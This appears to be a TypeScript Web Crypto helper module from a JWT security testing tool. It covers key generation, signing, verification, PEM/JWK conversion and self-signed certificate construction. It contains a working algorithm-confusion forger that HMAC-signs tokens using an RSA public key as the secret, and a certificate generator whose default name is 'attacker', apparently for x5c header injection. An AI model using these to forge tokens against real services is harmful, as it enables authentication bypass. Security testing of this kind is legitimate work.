// Web Crypto API helpers - RSA/EC key generation, HMAC signing, etc.

import { base64UrlEncodeBytes, base64UrlDecodeBytes } from "./jwt";

function selectHashAlgorithm(alg: string): AlgorithmIdentifier {
  if (alg.endsWith("384")) return "SHA-384";
  if (alg.endsWith("512")) return "SHA-512";
  return "SHA-256";
}

// WebCrypto rejects empty keys; pad to SHA-256 block size (64 bytes)
function toHmacKeyBuffer(secretBytes: Uint8Array): ArrayBuffer {
  return secretBytes.byteLength === 0
    ? new Uint8Array(64).buffer
    : secretBytes.buffer.slice(secretBytes.byteOffset, secretBytes.byteOffset + secretBytes.byteLength) as ArrayBuffer;
}

export interface RsaKeyPair {
  publicKey: CryptoKey;
  privateKey: CryptoKey;
  publicKeyJwk: JsonWebKey;
  privateKeyJwk: JsonWebKey;
  publicKeyPem: string;
}

export async function generateRsaKeyPair(): Promise<RsaKeyPair> {
  const pair = await crypto.subtle.generateKey(
    {
      name: "RSASSA-PKCS1-v1_5",
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: "SHA-256",
    },
    true,
    ["sign", "verify"]
  );

  const publicKeyJwk = await crypto.subtle.exportKey("jwk", pair.publicKey);
  const privateKeyJwk = await crypto.subtle.exportKey("jwk", pair.privateKey);
  const publicKeyDer = await crypto.subtle.exportKey("spki", pair.publicKey);
  const publicKeyPem = derToPem(publicKeyDer, "PUBLIC KEY");

  return {
    publicKey: pair.publicKey,
    privateKey: pair.privateKey,
    publicKeyJwk,
    privateKeyJwk,
    publicKeyPem,
  };
}

export async function signHmacSha256(data: string, keyBytes: Uint8Array): Promise<Uint8Array> {
  const keyData = toHmacKeyBuffer(keyBytes);
  const key = await crypto.subtle.importKey(
    "raw",
    keyData,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(data));
  return new Uint8Array(sig);
}

export async function signRs256(data: string, privateKeyJwk: JsonWebKey): Promise<Uint8Array> {
  const key = await crypto.subtle.importKey(
    "jwk",
    privateKeyJwk,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign(
    "RSASSA-PKCS1-v1_5",
    key,
    new TextEncoder().encode(data)
  );
  return new Uint8Array(sig);
}

// Algorithm confusion: sign with HMAC using public key PEM bytes as secret
export async function signAlgorithmConfusion(
  headerB64: string,
  payloadB64: string,
  publicKeyPem: string
): Promise<{ token: string; variant: string }[]> {
  const results: { token: string; variant: string }[] = [];
  const data = `${headerB64}.${payloadB64}`;

  // Variant 1: exact PEM string bytes
  const pemBytes = new TextEncoder().encode(publicKeyPem);
  const sig1 = await signHmacSha256(data, pemBytes);
  results.push({
    variant: "PEM exact bytes",
    token: `${data}.${base64UrlEncodeBytes(sig1)}`,
  });

  // Variant 2: PEM without trailing newline
  const pemTrimmed = publicKeyPem.trimEnd();
  const pemTrimmedBytes = new TextEncoder().encode(pemTrimmed);
  const sig2 = await signHmacSha256(data, pemTrimmedBytes);
  results.push({
    variant: "PEM trimmed (no trailing newline)",
    token: `${data}.${base64UrlEncodeBytes(sig2)}`,
  });

  return results;
}

// Import RSA public key from PEM for use in JWK export
export async function importRsaPublicKeyFromPem(pem: string): Promise<CryptoKey> {
  const der = pemToDer(pem);
  return crypto.subtle.importKey(
    "spki",
    der,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    true,
    ["verify"]
  );
}

export async function importRsaPrivateKeyFromJwk(jwk: JsonWebKey): Promise<CryptoKey> {
  return crypto.subtle.importKey(
    "jwk",
    jwk,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    true,
    ["sign"]
  );
}

export function derToPem(der: ArrayBuffer, label: string): string {
  // base64url -> standard base64 (re-add padding stripped by base64UrlEncodeBytes)
  const b64url = base64UrlEncodeBytes(new Uint8Array(der));
  const base64 = (b64url + "=".repeat((4 - b64url.length % 4) % 4)).replace(/-/g, "+").replace(/_/g, "/");
  const lines = base64.match(/.{1,64}/g) ?? [];
  return `-----BEGIN ${label}-----\n${lines.join("\n")}\n-----END ${label}-----\n`;
}

export function pemToDer(pem: string): ArrayBuffer {
  const base64 = pem
    .replace(/-----BEGIN [^-]+-----/g, "")
    .replace(/-----END [^-]+-----/g, "")
    .replace(/\s/g, "");
  // standard base64 -> base64url so base64UrlDecodeBytes can handle it
  const b64url = base64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
  const bytes = base64UrlDecodeBytes(b64url);
  return bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength) as ArrayBuffer;
}

export async function publicKeyJwkFromPem(pem: string): Promise<JsonWebKey> {
  const key = await importRsaPublicKeyFromPem(pem);
  return crypto.subtle.exportKey("jwk", key);
}

// Compute JWK thumbprint (RFC 7638)
export async function jwkThumbprint(jwk: JsonWebKey): Promise<string> {
  let canonical: Record<string, unknown>;
  if (jwk.kty === "RSA") {
    canonical = { e: jwk.e, kty: jwk.kty, n: jwk.n };
  } else if (jwk.kty === "EC") {
    canonical = { crv: jwk.crv, kty: jwk.kty, x: jwk.x, y: jwk.y };
  } else {
    canonical = { k: jwk.k, kty: jwk.kty };
  }
  const data = new TextEncoder().encode(JSON.stringify(canonical));
  const hash = await crypto.subtle.digest("SHA-256", data);
  return base64UrlEncodeBytes(new Uint8Array(hash));
}

// Convert JWKS JSON or single JWK JSON → PEM public key
export async function jwksToPem(input: string): Promise<string> {
  const parsed = JSON.parse(input) as Record<string, unknown>;
  let jwk: JsonWebKey;

  if (Array.isArray(parsed.keys)) {
    const rsaKey = (parsed.keys as unknown[]).find(
      (k): k is JsonWebKey =>
        typeof k === "object" && k !== null && (k as Record<string, unknown>).kty === "RSA"
    );
    if (!rsaKey) throw new Error("No RSA key found in JWKS");
    jwk = rsaKey;
  } else if (parsed.kty === "RSA") {
    jwk = parsed as JsonWebKey;
  } else {
    throw new Error('Expected JWKS {"keys":[...]} or single RSA JWK {"kty":"RSA",...}');
  }

  const hashAlg = typeof jwk.alg === "string" ? selectHashAlgorithm(jwk.alg) : "SHA-256";

  const cleanJwk: JsonWebKey = { kty: jwk.kty, n: jwk.n, e: jwk.e, ext: true };
  const key = await crypto.subtle.importKey(
    "jwk",
    cleanJwk,
    { name: "RSASSA-PKCS1-v1_5", hash: hashAlg },
    true,
    ["verify"]
  );
  const der = await crypto.subtle.exportKey("spki", key);
  return derToPem(der, "PUBLIC KEY");
}

export async function importJwkAsPem(jwk: JsonWebKey): Promise<string> {
  let algorithm: RsaHashedImportParams | EcKeyImportParams | Algorithm;
  if (jwk.kty === "RSA") {
    const hash = typeof jwk.alg === "string" ? selectHashAlgorithm(jwk.alg) : "SHA-256";
    const name = typeof jwk.alg === "string" && jwk.alg.startsWith("PS") ? "RSA-PSS" : "RSASSA-PKCS1-v1_5";
    algorithm = { name, hash };
  } else if (jwk.kty === "EC") {
    algorithm = { name: "ECDSA", namedCurve: jwk.crv ?? "P-256" };
  } else if (jwk.kty === "OKP") {
    algorithm = { name: "Ed25519" };
  } else {
    throw new Error(`Unsupported key type: ${jwk.kty}`);
  }
  const key = await crypto.subtle.importKey("jwk", { ...jwk, ext: true }, algorithm, true, ["verify"]);
  const der = await crypto.subtle.exportKey("spki", key);
  return derToPem(der, "PUBLIC KEY");
}

export async function verifyAsymmetricSignature(
  rawHeader: string,
  rawPayload: string,
  rawSignature: string,
  alg: string,
  publicKeyPem: string
): Promise<boolean> {
  const data = new TextEncoder().encode(`${rawHeader}.${rawPayload}`);
  const sigRaw = base64UrlDecodeBytes(rawSignature);
  const sigBytes = sigRaw.buffer.slice(sigRaw.byteOffset, sigRaw.byteOffset + sigRaw.byteLength) as ArrayBuffer;
  const der = pemToDer(publicKeyPem);

  let key: CryptoKey;
  let verifyParams: AlgorithmIdentifier | RsaPssParams | EcdsaParams;

  if (alg.startsWith("RS")) {
    const hash = selectHashAlgorithm(alg);
    key = await crypto.subtle.importKey("spki", der, { name: "RSASSA-PKCS1-v1_5", hash }, false, ["verify"]);
    verifyParams = "RSASSA-PKCS1-v1_5";
  } else if (alg.startsWith("PS")) {
    const hash = selectHashAlgorithm(alg);
    const saltLength = alg === "PS384" ? 48 : alg === "PS512" ? 64 : 32;
    key = await crypto.subtle.importKey("spki", der, { name: "RSA-PSS", hash }, false, ["verify"]);
    verifyParams = { name: "RSA-PSS", saltLength };
  } else if (alg.startsWith("ES")) {
    const crv = alg === "ES384" ? "P-384" : alg === "ES512" ? "P-521" : "P-256";
    const hash = selectHashAlgorithm(alg);
    key = await crypto.subtle.importKey("spki", der, { name: "ECDSA", namedCurve: crv }, false, ["verify"]);
    verifyParams = { name: "ECDSA", hash };
  } else if (alg === "EdDSA") {
    key = await crypto.subtle.importKey("spki", der, { name: "Ed25519" }, false, ["verify"]);
    verifyParams = { name: "Ed25519" };
  } else {
    throw new Error(`Unsupported algorithm: ${alg}`);
  }

  return crypto.subtle.verify(verifyParams, key, sigBytes, data);
}

export async function signHmac(
  rawHeader: string,
  rawPayload: string,
  secretBytes: Uint8Array,
  alg: string
): Promise<string> {
  const hashAlg = selectHashAlgorithm(alg);
  const key = await crypto.subtle.importKey("raw", toHmacKeyBuffer(secretBytes), { name: "HMAC", hash: hashAlg }, false, ["sign"]);
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(`${rawHeader}.${rawPayload}`));
  return base64UrlEncodeBytes(new Uint8Array(sig));
}

// ── EC keypair (ES256 / P-256) ───────────────────────────────────────────────

export interface EcKeyPair {
  publicKey: CryptoKey;
  privateKey: CryptoKey;
  publicKeyJwk: JsonWebKey;
  privateKeyJwk: JsonWebKey;
  publicKeyPem: string;
}

export async function generateEcKeyPair(): Promise<EcKeyPair> {
  const pair = await crypto.subtle.generateKey(
    { name: "ECDSA", namedCurve: "P-256" },
    true,
    ["sign", "verify"]
  );
  const publicKeyJwk  = await crypto.subtle.exportKey("jwk", pair.publicKey);
  const privateKeyJwk = await crypto.subtle.exportKey("jwk", pair.privateKey);
  const publicKeyDer  = await crypto.subtle.exportKey("spki", pair.publicKey);
  const publicKeyPem  = derToPem(publicKeyDer, "PUBLIC KEY");
  return { publicKey: pair.publicKey, privateKey: pair.privateKey, publicKeyJwk, privateKeyJwk, publicKeyPem };
}

export async function signEs256(data: string, privateKeyJwk: JsonWebKey): Promise<Uint8Array> {
  const key = await crypto.subtle.importKey(
    "jwk", privateKeyJwk,
    { name: "ECDSA", namedCurve: "P-256" },
    false, ["sign"]
  );
  const sig = await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, key, new TextEncoder().encode(data));
  return new Uint8Array(sig);
}

// ── ASN.1 DER helpers (self-signed X.509 certificate) ───────────────────────

function concatU8(arrays: Uint8Array[]): Uint8Array {
  const total = arrays.reduce((n, a) => n + a.length, 0);
  const out = new Uint8Array(total);
  let offset = 0;
  for (const a of arrays) { out.set(a, offset); offset += a.length; }
  return out;
}

function derLen(len: number): Uint8Array {
  if (len < 128) return new Uint8Array([len]);
  const b: number[] = [];
  let n = len;
  while (n > 0) { b.unshift(n & 0xff); n >>= 8; }
  return new Uint8Array([0x80 | b.length, ...b]);
}

function tlvTag(tag: number, v: Uint8Array): Uint8Array {
  return concatU8([new Uint8Array([tag]), derLen(v.length), v]);
}

const derSeqOf  = (parts: Uint8Array[]) => tlvTag(0x30, concatU8(parts));
const derSetOf  = (parts: Uint8Array[]) => tlvTag(0x31, concatU8(parts));
const derOid    = (b: number[])         => tlvTag(0x06, new Uint8Array(b));
const derUtf8   = (s: string)           => tlvTag(0x0c, new TextEncoder().encode(s));
const derNull   = ()                    => new Uint8Array([0x05, 0x00]);
const derBitStr = (v: Uint8Array)       => tlvTag(0x03, concatU8([new Uint8Array([0x00]), v]));

function derPosInt(b: Uint8Array): Uint8Array {
  const v = (b[0] & 0x80) ? concatU8([new Uint8Array([0x00]), b]) : b;
  return tlvTag(0x02, v);
}

function derSmallInt(n: number): Uint8Array {
  return tlvTag(0x02, new Uint8Array([n]));
}

function derUtcTime(d: Date): Uint8Array {
  const p = (n: number) => n.toString().padStart(2, "0");
  const y = d.getUTCFullYear().toString().slice(-2);
  const s = `${y}${p(d.getUTCMonth() + 1)}${p(d.getUTCDate())}${p(d.getUTCHours())}${p(d.getUTCMinutes())}${p(d.getUTCSeconds())}Z`;
  return tlvTag(0x17, new TextEncoder().encode(s));
}

// sha256WithRSAEncryption  1.2.840.113549.1.1.11
const OID_SHA256_RSA   = [0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b];
// ecdsa-with-SHA256        1.2.840.10045.4.3.2
const OID_ECDSA_SHA256 = [0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02];
// id-at-commonName         2.5.4.3
const OID_CN           = [0x55, 0x04, 0x03];

function certAlgId(isEc: boolean): Uint8Array {
  // ECDSA AlgorithmIdentifier omits NULL param (RFC 5758); RSA includes it
  return isEc
    ? derSeqOf([derOid(OID_ECDSA_SHA256)])
    : derSeqOf([derOid(OID_SHA256_RSA), derNull()]);
}

function certRdnName(cn: string): Uint8Array {
  return derSeqOf([derSetOf([derSeqOf([derOid(OID_CN), derUtf8(cn)])])]);
}

// P-256 raw signature (r||s, 32 bytes each) → DER SEQUENCE { INTEGER r, INTEGER s }
function ecRawSigToDer(raw: Uint8Array): Uint8Array {
  return derSeqOf([derPosInt(raw.slice(0, 32)), derPosInt(raw.slice(32))]);
}

export interface CertInfo {
  certDer: Uint8Array;
  certPem: string;
  certB64: string; // standard base64 (not base64url) for x5c header
}

export async function generateSelfSignedCert(
  publicKey: CryptoKey,
  privateKey: CryptoKey,
  isEc: boolean,
  cn = "attacker"
): Promise<CertInfo> {
  const spki   = new Uint8Array(await crypto.subtle.exportKey("spki", publicKey));
  const now    = new Date();
  const exp    = new Date(now.getTime() + 365 * 24 * 60 * 60 * 1000);
  const serial = crypto.getRandomValues(new Uint8Array(8));
  const alg    = certAlgId(isEc);
  const name   = certRdnName(cn);

  const tbs = derSeqOf([
    tlvTag(0xa0, derSmallInt(2)),               // [0] version v3
    derPosInt(serial),                           // serialNumber
    alg,                                         // signature algorithm
    name,                                        // issuer
    derSeqOf([derUtcTime(now), derUtcTime(exp)]),// validity
    name,                                        // subject
    spki,                                        // subjectPublicKeyInfo (SPKI DER)
  ]);

  // Coerce to ArrayBuffer so WebCrypto strict typing is satisfied
  const tbsBuf = tbs.buffer.slice(tbs.byteOffset, tbs.byteOffset + tbs.byteLength) as ArrayBuffer;

  let sigVal: Uint8Array;
  if (isEc) {
    const raw = new Uint8Array(await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, privateKey, tbsBuf));
    sigVal = ecRawSigToDer(raw);
  } else {
    sigVal = new Uint8Array(await crypto.subtle.sign("RSASSA-PKCS1-v1_5", privateKey, tbsBuf));
  }

  const certDer = derSeqOf([tbs, alg, derBitStr(sigVal)]);
  const certB64 = btoa(Array.from(certDer, b => String.fromCharCode(b)).join(""));
  const certPem = `-----BEGIN CERTIFICATE-----\n${certB64.match(/.{1,64}/g)!.join("\n")}\n-----END CERTIFICATE-----\n`;

  return { certDer, certPem, certB64 };
}

// Verify an HMAC-signed JWT against a known secret
export async function verifyHmacSignature(
  rawHeader: string,
  rawPayload: string,
  rawSignature: string,
  secretBytes: Uint8Array,
  alg: string
): Promise<boolean> {
  const hashAlg = selectHashAlgorithm(alg);
  const key = await crypto.subtle.importKey(
    "raw",
    toHmacKeyBuffer(secretBytes),
    { name: "HMAC", hash: hashAlg },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign(
    "HMAC",
    key,
    new TextEncoder().encode(`${rawHeader}.${rawPayload}`)
  );
  const computed = base64UrlEncodeBytes(new Uint8Array(sig));
  return computed === rawSignature;
}
